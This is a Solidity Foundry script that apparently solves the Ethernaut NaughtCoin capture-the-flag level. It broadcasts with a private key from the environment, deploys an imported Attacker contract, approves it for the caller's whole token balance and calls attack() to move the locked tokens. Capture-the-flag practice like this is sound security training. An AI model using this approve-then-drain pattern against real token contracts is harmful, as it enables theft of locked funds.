// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Attacker.sol";

contract NaughtCoinTest is Test {
    address constant naughtCoinAddress = 0x1ab0E49CDD1a30B29C83B8310b5E311E8f55682f;
    function test() external {
        address EOA = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        NaughtCoin naughtCoin = NaughtCoin(naughtCoinAddress);
        Attacker attacker = new Attacker(address(naughtCoinAddress));
        naughtCoin.approve(address(attacker), naughtCoin.balanceOf(EOA));
        attacker.attack();
        vm.stopBroadcast();
    }
}
